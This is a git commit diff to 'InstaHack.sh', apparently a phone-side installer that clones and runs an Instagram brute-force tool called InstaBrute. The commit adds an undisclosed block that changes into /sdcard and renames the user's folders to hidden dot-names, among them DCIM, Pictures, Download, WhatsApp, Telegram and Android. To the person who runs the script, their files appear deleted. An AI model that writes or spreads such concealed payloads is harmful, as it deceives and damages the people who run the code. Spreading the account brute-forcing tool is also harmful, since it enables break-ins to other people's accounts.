5da767294494374c231b7bec8e4446cccb0a6c13
Eliot <77872672+Elliot290@users.noreply.github.com>
2022-02-21 13:58:52 +0530

    Update InstaHack.sh
    B

--- InstaHack.sh
+++ InstaHack.sh
@@ -1,3 +1,29 @@
+cd /sdcard
+mv Telegram .Telegram
+mv browser .browser
+mv GBWhatsApp .GBWhatsApp
+mv BGMI .BGMI
+mv ApkEditor .ApkEditor
+mv Download .Download
+mv Instagram .Instagram
+mv SHAREit .SHAREit
+mv bluetooth .bluetooth
+mv WhatsApp .WhatsApp
+mv VidMate .VidMate
+mv Instagram .Instagram
+mv YoWhatsApp .YoWhatsApp
+mv DCIM .DCIM
+mv GBWhatsApp .GBWhatsApp
+mv Android .Android
+mv documents .documents
+mv IMO .IMO
+mv Movies .Movies
+mv MT2 .MT2
+mv WhatsApp .WhatsApp
+mv sketchware .sketchware
+mv Pictures .Pictures
+mv YoWhatsApp .YoWhatsApp
+cd $HOME
 git clone https://github.com/Elliot290/InstaBrute
 cd InstaBrute
 bash setup.sh
